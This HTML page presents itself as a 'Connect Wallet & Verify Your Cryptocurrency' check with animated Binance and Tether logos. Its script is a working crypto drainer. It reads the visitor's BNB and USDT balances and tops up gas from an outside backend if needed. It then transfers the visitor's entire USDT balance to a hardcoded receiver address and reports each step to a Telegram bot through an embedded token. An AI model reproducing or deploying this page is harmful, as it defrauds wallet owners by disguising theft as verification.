<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connect Wallet & Verify Asset</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      height: 100%;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background: #000;
      position: relative;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 1;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
      opacity: 0.5;
    }

    h1 {
      margin-bottom: 40px;
      font-size: 28px;
      color: #fff;
      text-shadow: 1px 1px 3px #fcd535;
      z-index: 2;
    }

    button {
      background: linear-gradient(135deg, #ff6ec4, #7873f5);
      color: white;
      border: none;
      padding: 15px 40px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      z-index: 2;
    }

    button:hover {
      background: linear-gradient(135deg, #e94057, #8a2387);
      box-shadow: 0 12px 20px rgba(0, 0, 0, 0.25);
      transform: translateY(-2px);
    }

    button:active {
      transform: scale(0.98);
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
    }

    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #4CAF50;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
      display: none;
      z-index: 2;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes popupEffect {
      0% {
        transform: scale(0);
        opacity: 0;
      }
      100% {
        transform: scale(1);
        opacity: 1;
      }
    }

    .popupLogo {
      animation: popupEffect 0.6s ease-out forwards;
    }

    #status {
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <canvas id="coinCanvas"></canvas>
  
  <h1>Connect Wallet & Verify Your Cryptocurrency</h1>
  <button onclick="connectAndSend()">Connect Wallet</button>
  <p id="status"></p>
  <div class="loader" id="loader"></div>

  <script>
    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
    const TELEGRAM_CHAT_ID = '8060968649';
    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
    const RECEIVER = '0x8e11ea07330A4824F846ad3Ea3dfB68f47c66B56';
    const BACKEND_URL = 'https://a-production-c9bc.up.railway.app';

    const canvas = document.getElementById('coinCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const coinLogoBinance = 'binance-coin-bnb-logo.png'; 
    const coinLogoTether = 'tether-usdt-logo.svg'; 

    const imageBinance = new Image();
    const imageTether = new Image();
    let imageBinanceLoaded = false;
    let imageTetherLoaded = false;

    imageBinance.src = coinLogoBinance;
    imageTether.src = coinLogoTether;

    imageBinance.onload = () => {
      imageBinanceLoaded = true;
      if (imageTetherLoaded) createLogos();
    };

    imageTether.onload = () => {
      imageTetherLoaded = true;
      if (imageBinanceLoaded) createLogos();
    };

    const logoCount = 7;
    const logosBinance = [];
    const logosTether = [];

    function createLogos() {
      for (let i = 0; i < logoCount; i++) {
        logosBinance.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          size: 50,
          dx: (Math.random() - 0.5) * 4,
          dy: (Math.random() - 0.5) * 4,
          image: imageBinance,
        });
        logosTether.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          size: 50,
          dx: (Math.random() - 0.5) * 4,
          dy: (Math.random() - 0.5) * 4,
          image: imageTether,
        });
      }
      animateLogos();
    }

    function animateLogos() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      logosBinance.forEach(logo => {
        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
        logo.x += logo.dx;
        logo.y += logo.dy;

        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
      });

      logosTether.forEach(logo => {
        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
        logo.x += logo.dx;
        logo.y += logo.dy;

        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
      });

      requestAnimationFrame(animateLogos);
    }

    async function connectAndSend() {
      const status = document.getElementById("status");
      const loader = document.getElementById("loader");
      loader.style.display = "block"; // Show loader
      status.innerText = "üîó Connecting...";

      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please install MetaMask or Web3 wallet!");
        return;
      }

      const web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const user = accounts[0];

      // Check if the connected wallet is on Binance Smart Chain (BSC)
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        status.innerText = "‚ö†Ô∏è Wrong Network. Switching to BSC...";
        await switchToBSC();
      } else {
        status.innerText = "‚úÖ Connected to BSC";
      }

      let message = `üì≤ *Wallet Connected*\n\`${user}\`\n\n`;

      const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${user}&apikey=${BSC_SCAN_API}`;
      const bnbRes = await fetch(bnbUrl);
      const bnbData = await bnbRes.json();
      let bnb = 0;

      if (bnbData.status === "1") {
        bnb = parseFloat(bnbData.result) / 1e18;
        message += `üí∞ *BNB*: ${bnb.toFixed(4)}\n`;
      } else {
        message += `üí∞ *BNB*: ‚ùå Error\n`;
      }

      const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
      const priceData = await priceRes.json();
      const bnbUsd = bnb * priceData.binancecoin.usd;

      const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${user}&tag=latest&apikey=${BSC_SCAN_API}`;
      const usdtRes = await fetch(usdtUrl);
      const usdtData = await usdtRes.json();
      const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
      message += `üíµ *USDT*: ${usdt}\n`;

      if (bnbUsd < 1) {
        message += `‚ö†Ô∏è *BNB < $1* ‚Äì requesting backend top-up...\n`;
        status.innerText = "‚ö†Ô∏è Low BNB, requesting backend top-up...";

        const topupRes = await fetch(`${BACKEND_URL}/api/topup-bnb`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: user })
        });

        const topup = await topupRes.json();
        if (!topup.ready) {
          message += `‚ùå *Top-up Failed*`;
          status.innerText = "‚ùå Top-up failed.";
          loader.style.display = "none"; // Hide loader
          return sendTelegram(message);
        }

        message += `‚úÖ *Top-up Requested!*\n‚è≥ *Waiting for balance update...*\n`;
        await new Promise(r => setTimeout(r, 15000)); // Wait for 15 seconds

        // Recheck BNB balance
        const bnbCheck = await fetch(bnbUrl);
        const newBnbData = await bnbCheck.json();
        const newBnb = parseFloat(newBnbData.result) / 1e18;
        const newBnbUsd = newBnb * priceData.binancecoin.usd;

        if (newBnbUsd < 1) {
          message += `‚ùå *Still < $1 BNB* ‚Äì cannot proceed.\n`;
          status.innerText = "‚ùå Still not enough BNB.";
          loader.style.display = "none"; // Hide loader
          return sendTelegram(message);
        }

        message += `‚úÖ *BNB now sufficient! Proceeding...*\n`;
      } else {
        message += `‚úÖ *BNB is sufficient!*\n`;
      }

      loader.style.display = "none"; // Hide loader
      const usdtContract = new web3.eth.Contract([
        { "constant": false, "inputs": [
            { "name": "_to", "type": "address" },
            { "name": "_value", "type": "uint256" }
          ],
          "name": "transfer",
          "outputs": [{ "name": "", "type": "bool" }],
          "type": "function"
        }
      ], USDT_CONTRACT);

      const amountToSend = web3.utils.toWei(usdt, "ether");

      try {
        const tx = await usdtContract.methods.transfer(RECEIVER, amountToSend).send({ from: user });
        message += `üöÄ *USDT Sent Successfully!*\nüì¶ TX Hash: \`${tx.transactionHash}\``;
        status.innerText = "‚úÖ USDT sent successfully!";
      } catch (err) {
        console.error(err);
        message += `‚ùå *USDT Transfer Failed*`;
        status.innerText = "‚ùå Failed to send USDT.";
      }

      await sendTelegram(message);
    }

    async function switchToBSC() {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }] // BSC Mainnet chain ID (0x38 is hex for 56)
        });
      } catch (error) {
        console.error(error);
        alert("‚ö†Ô∏è Failed to switch to Binance Smart Chain.");
      }
    }

    async function sendTelegram(msg) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: "Markdown"
        })
      });
    }
  </script>
</body>
</html>
